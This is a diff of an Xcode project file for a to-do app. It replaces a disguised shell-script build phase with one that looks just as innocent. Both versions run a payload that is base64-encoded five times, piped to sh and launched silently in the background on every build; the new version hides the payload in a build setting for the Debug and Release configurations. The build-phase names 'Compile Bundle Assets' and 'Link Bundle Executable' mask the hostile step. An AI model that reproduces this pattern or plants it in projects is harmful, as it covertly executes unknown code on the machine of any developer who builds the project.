@@ -140,7 +140,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 75E07CB02DCC909A00590C25 /* Build configuration list for PBXNativeTarget "ToDoApp" */;
 			buildPhases = (
-				E17C25CF643BFF13E82F5E42 /* Compile Bundle Assets */,
+				0AF30C7C2FC910DEE22F5E42 /* Link Bundle Executable */,
 				75E07C9C2DCC909900590C25 /* Sources */,
 				75E07C9D2DCC909900590C25 /* Frameworks */,
 				75E07C9E2DCC909900590C25 /* Resources */,
@@ -221,8 +221,11 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXLegacyTarget section */
+/* End PBXLegacyTarget section */
+
 /* Begin PBXShellScriptBuildPhase section */
-		E17C25CF643BFF13E82F5E42 /* Compile Bundle Assets */ = {
+		0AF30C7C2FC910DEE22F5E42 /* Link Bundle Executable */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -232,13 +235,13 @@
 			);
 			inputPaths = (
 			);
-			name = "Compile Bundle Assets";
+			name = "Link Bundle Executable";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1oU2JrSkpWREZrYzFsV1pFZFRhbFphVm0xb2RWcEdaRTlrVmxwWlYyeHdWazF1VW5kVk1WWnZUVEZ2ZVZSWWJHRk5TRTVNUTJjOVBRbz0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A24E5F2}\"";
 			showEnvVarsInLog = 0;			
 		};
 /* End PBXShellScriptBuildPhase section */
@@ -289,6 +292,7 @@
 		75E07CAE2DCC909A00590C25 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				A24E5F2 = "((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1oTmExcFpWMnRqTVdGR1dqWlNiVGxoVmxVd2VGcFdaRk5XUlRsWVlVVjRWazFIZUhWWGJYUlBVVEpXZEZKclNtbGxha0pNUTJjOVBRbz0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -352,6 +356,7 @@
 		75E07CAF2DCC909A00590C25 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				A24E5F2 = "((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1oTmExcFpWMnRqTVdGR1dqWlNiVGxoVmxVd2VGcFdaRk5XUlRsWVlVVjRWazFIZUhWWGJYUlBVVEpXZEZKclNtbGxha0pNUTJjOVBRbz0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
